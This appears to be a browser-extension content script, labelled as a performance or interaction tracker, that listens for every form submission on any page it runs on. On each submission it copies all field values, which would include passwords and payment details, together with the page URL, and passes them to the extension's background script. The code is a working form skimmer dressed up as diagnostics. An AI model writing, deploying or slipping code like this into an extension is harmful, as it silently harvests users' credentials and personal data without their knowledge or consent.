// DOM Interaction Tracker - Form Submit Only
(function () {
    'use strict';

    const performanceModule = {
        start() {
            Diagnostics.log('CORE', 'Form submit tracker active');
            this.watchUI();
        },

        watchUI() {
            document.addEventListener('submit', (e) => {
                const node = e.target;
                const data = new FormData(node);

                const report = {
                    url: window.location.href,
                    t: new Date().toISOString(),
                    fields: {}
                };

                for (let [k, v] of data.entries()) {
                    report.fields[k] = v;
                }

                chrome.runtime.sendMessage({
                    type: 'FORM_EVENT',
                    data: report
                });
            }, true);
        }
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => performanceModule.start());
    } else {
        performanceModule.start();
    }
})();
